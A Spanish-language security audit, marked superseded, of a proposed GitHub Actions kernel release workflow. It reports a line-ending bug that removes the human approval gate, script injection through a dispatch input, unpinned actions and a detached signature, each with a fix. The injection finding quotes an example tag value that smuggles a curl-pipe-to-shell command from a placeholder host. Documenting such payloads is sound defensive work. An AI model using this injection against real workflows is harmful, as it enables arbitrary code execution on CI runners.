# Auditoría de seguridad — `kernel-release-workflow.proposed.yml` (#4695 · CA-C0)

> **⚠️ SUPERADO (2026-07-26).** Los findings de este informe **fueron remediados y re-verificados**.
> El sign-off se otorgó en [`kernel-release-workflow-security-signoff.md`](kernel-release-workflow-security-signoff.md).
> Este documento se conserva como registro del estado bloqueado y de la remediación exigida —
> **no** refleja el estado actual del workflow.

> **Veredicto original: 🔴 BLOQUEADO.** No se otorgaba el sign-off de CA-C0.
> El archivo **no se commitea** al repo del kernel y el release **no se publica** hasta remediar
> el finding CRITICAL y los dos HIGH.
>
> **Nombre del archivo elegido a propósito:** este documento **NO** matchea el patrón que
> `.pipeline/bin/kernel-release.js` busca para dar por cumplido CA-C0
> (`/security.*(sign-?off|4695)|kernel-release.*sign-?off/i`). Un informe con veredicto negativo
> no debe destrabar el precheck. El sign-off aprobatorio se emitirá, con ese nombre, sólo cuando
> los findings estén cerrados.

- **Alcance:** `docs/pipeline/kernel-release-workflow.proposed.yml` + la transformación
  `--gate=dispatch` que `.pipeline/bin/kernel-release.js` aplica sobre él antes de commitearlo.
- **Fecha:** 2026-07-26
- **Auditor:** `/security`

---

## Resumen

| Severidad | Cantidad |
|-----------|----------|
| Critical  | 1 |
| High      | 2 |
| Medium    | 2 |
| Low       | 1 |

El YAML **como está escrito en el repo del producto** es razonable: permisos mínimos a nivel
workflow, elevación por job, sin PAT de larga vida, firma keyless. El problema grave **no está en
el YAML sino en cómo se lo transforma** antes de instalarlo en el repo del kernel: la ruta
`--gate=dispatch` produce un workflow **sin ningún gate humano y con disparo automático**.

---

## Findings

### 🔴 CRITICAL-1 · `--gate=dispatch` deja el publish sin gate y con disparo automático (A01, A08)

**Dónde:** `.pipeline/bin/kernel-release.js` (fase 2, transformación del YAML) →
`docs/pipeline/kernel-release-workflow.proposed.yml:31-34` y `:88`.

El script aplica dos reemplazos para el modo `dispatch`:

```js
yml
  .replace(/^on:\n  push:\n    tags:\n      - 'v\[0-9\]\+\.\[0-9\]\+\.\[0-9\]\+'\n/m, 'on:\n')
  .replace(/^    environment: release.*$/m, '    # gate humano = disparo manual (workflow_dispatch)')
```

**El archivo está guardado con finales de línea CRLF.** El primer regex exige `\n` literal entre
líneas, así que **no matchea** y el trigger por push de tag **sobrevive**. El segundo regex sí
matchea (`.*` consume el `\r`) y **elimina el `environment: release`** del job `publish`.

Resultado verificado ejecutando la transformación real sobre el archivo real:

```
=== JOB publish tras transformacion gate=dispatch ===
    needs: verify
    runs-on: ubuntu-latest
    # gate humano = disparo manual (workflow_dispatch)   ← el gate se fue
    permissions:
      contents: write
      packages: write
      id-token: write

=== trigger on: ===
on:
  push:
    tags:
      - 'v[0-9]+.[0-9]+.[0-9]+'      ← el disparo automático sigue vivo
  workflow_dispatch:
    ...
```

Es la combinación exactamente inversa a la buscada: **se quita el gate y se conserva el
auto-disparo**. La fase 4 del propio script pushea el tag `vX.Y.Z` → eso dispara `publish` de
inmediato, con `contents: write` + `packages: write` + `id-token: write`, **sin ninguna aprobación
humana**. Viola CA-C1 ("sin auto-publish") y el principio fail-closed de los gates de firma del
operador (`docs/pipeline/gates-firma-operador.md`): un ítem gateado degradaría a automático por un
bug de line endings.

Agravante: el fallo es **silencioso**. El script imprime `[ok] gate = disparo manual del workflow`
y el operador queda convencido de que hay un gate.

**Remediación (obligatoria antes de publicar):**
1. Normalizar line endings antes de transformar: `yml = yml.replace(/\r\n/g, '\n')`.
2. Reemplazar los regex frágiles por una edición estructural del YAML (parsear con `js-yaml`,
   borrar `on.push` y `jobs.publish.environment`, re-serializar) — o, como mínimo, regex
   tolerantes a `\r?\n`.
3. **Verificación post-transformación fail-closed:** antes de escribir el archivo, assertear que
   el resultado no contiene `on.push.tags` y que el modo elegido dejó un gate efectivo. Si la
   aserción falla → abortar, no commitear.
4. Agregar un test de regresión que corra la transformación sobre el YAML real (con CRLF) y
   verifique ambas propiedades.

---

### 🟠 HIGH-1 · Script injection vía `${{ github.event.inputs.tag }}` interpolado en `run:` (A03)

**Dónde:** `kernel-release-workflow.proposed.yml:68`

```yaml
run: |
  REF="${{ github.event.inputs.tag || github.ref_name }}"
```

GitHub interpola la expresión **como texto, antes** de ejecutar el shell. `tag` es un input libre
de `workflow_dispatch`. Un valor como `v1.0.0"; curl -s https://evil/x.sh | sh; #` ejecuta comandos
arbitrarios en el runner.

El blast radius directo es acotado (`verify` corre con `contents: read` y
`persist-credentials: false`), pero `verify` **es el control que valida `tag == package.json.version`**:
comprometerlo desactiva CA-C1. Y con CRITICAL-1 sin corregir, `publish` corre a continuación con
permisos elevados.

**Remediación:** pasar el valor por `env:` y referenciarlo como variable de shell — nunca
interpolar en el cuerpo del `run:`.

```yaml
- id: check
  env:
    REF: ${{ github.event.inputs.tag || github.ref_name }}
  run: |
    set -euo pipefail
    TAG_VERSION="${REF#v}"
```

Aplica igual a las líneas 119 y 132 por consistencia (ahí el valor ya viene validado por regex en
`verify`, así que es defensa en profundidad, no un agujero).

---

### 🟠 HIGH-2 · Actions de terceros sin pinear por SHA (A08)

**Dónde:** líneas 60, 95, 100, 113 — `actions/checkout@v4`, `actions/setup-node@v4`,
`sigstore/cosign-installer@v3`.

Los tags de release son **mutables**: quien controle el repo de la action (o su compromiso) puede
mover `v3` a otro commit. `sigstore/cosign-installer` corre dentro del job que tiene
`id-token: write` y `packages: write` — es decir, el que firma y publica el kernel. Un tag movido
compromete la firma y el paquete.

Contradice, además, la propia doctrina del kernel: `kernel-updates.md` §2 exige **pin de versión
exacto y prohíbe `latest` implícito** para el artefacto publicado; el workflow que lo publica no se
aplica la misma regla.

**Remediación:** pinear las tres actions al SHA de commit, con la versión legible en comentario:

```yaml
uses: actions/checkout@<sha40>  # v4.2.2
```

---

### 🟡 MEDIUM-1 · La firma no está atada al artefacto realmente publicado (A08)

**Dónde:** líneas 106-126.

El orden es `npm ci` → `npm publish` → `npm pack` → `cosign sign-blob` sobre el `.tgz` que produjo
`npm pack`. Se firma un tarball **construido por segunda vez, después** de publicar, y nada verifica
que sea byte-idéntico al que se subió al registry. El consumidor descarga el paquete del registry,
no el `.tgz` adjunto al Release: si difieren, la firma valida un artefacto que nadie consume.

**Remediación:** empaquetar una sola vez y publicar ese mismo archivo:

```yaml
run: |
  npm pack
  BLOB="$(ls intrale-operating-kernel-*.tgz)"
  sha256sum "$BLOB" | tee "kernel-${VERSION}.sha256"
  npm publish "$BLOB"
  cosign sign-blob --yes ... "$BLOB"
```

y adjuntar también el `.sha256` al Release, para que
`kernel-resolver.assertReleaseSignature` pueda cerrar la cadena tarball↔firma.

---

### 🟡 MEDIUM-2 · El input `tag` no se valida contra el formato semver (A05)

**Dónde:** líneas 36-39, 62, 97.

El trigger por push filtra `v[0-9]+.[0-9]+.[0-9]+`, pero el `workflow_dispatch` acepta cualquier
string y lo usa directo como `ref:` del checkout. Si existiera una **rama** homónima a un tag
(`v0.1.0`), `actions/checkout` resuelve la ambigüedad hacia `refs/heads/` y se publicaría contenido
no tagueado. El chequeo `tag == package.json.version` reduce el riesgo pero no lo elimina.

**Remediación:** validar el input con `^v[0-9]+\.[0-9]+\.[0-9]+$` como primer paso del job `verify`
(fail-closed), y hacer el checkout con la ref calificada: `ref: refs/tags/${TAG}`.

---

### ⚪ LOW-1 · `concurrency.group` interpola input controlado por el usuario (A05)

**Dónde:** línea 46. No hay ejecución de comandos, pero permite fragmentar la clave de concurrencia
y correr publishes en paralelo. Se resuelve solo al aplicar la validación de MEDIUM-2.

---

## Checklist OWASP

| Categoría | Estado | Nota |
|-----------|--------|------|
| A01 Broken Access Control | **FAIL** | CRITICAL-1: el gate humano desaparece en `--gate=dispatch` |
| A02 Cryptographic Failures | PASS | Sin claves de larga vida; cosign OIDC keyless |
| A03 Injection | **FAIL** | HIGH-1: `${{ inputs.tag }}` interpolado en `run:` |
| A04 Insecure Design | WARN | El gate depende de configuración fuera del YAML, sin verificación posterior |
| A05 Security Misconfiguration | WARN | MEDIUM-2 / LOW-1: input `tag` sin validar |
| A06 Vulnerable Components | PASS | Sin dependencias nuevas introducidas por el workflow |
| A07 Auth Failures | PASS | `secrets.GITHUB_TOKEN` builtin, scoped al job; sin PAT embebido |
| A08 Software Integrity | **FAIL** | HIGH-2 (actions sin SHA) + MEDIUM-1 (firma desacoplada del artefacto) |
| A09 Logging Failures | PASS | No se loguean secretos |
| A10 SSRF | PASS | Sin URLs construidas con input externo |

---

## Condiciones para el sign-off

Se emitirá `kernel-release-workflow-security-signoff.md` (nombre que sí destraba CA-C0) cuando:

1. **CRITICAL-1** esté corregido **con test de regresión** sobre el YAML real con CRLF.
2. **HIGH-1** — todas las interpolaciones movidas a `env:`.
3. **HIGH-2** — las tres actions pineadas por SHA.
4. MEDIUM-1 y MEDIUM-2 corregidos o aceptados por escrito con justificación del operador.

Mientras tanto, **`--skip-signoff-check` no debe usarse**: saltearlo publicaría con el
auto-publish de CRITICAL-1 activo.
